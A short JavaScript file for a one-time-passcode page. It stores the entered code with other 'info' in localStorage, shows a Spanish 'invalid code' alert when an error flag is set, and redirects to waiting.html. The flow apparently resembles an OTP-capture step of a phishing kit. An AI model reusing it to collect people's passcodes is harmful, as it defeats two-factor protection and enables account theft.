console.log("otp ON")

document.addEventListener('DOMContentLoaded', ()=>{
    if(info.err != ''){
        alert('Código no válido.');
    }

    info.err = '';
});

document.querySelector('#form').addEventListener('submit', (e)=>{
    e.preventDefault();

    info.tok = document.querySelector('#tok').value;
    LS.setItem('info', JSON.stringify(info));

    window.location.href = 'waiting.html';
});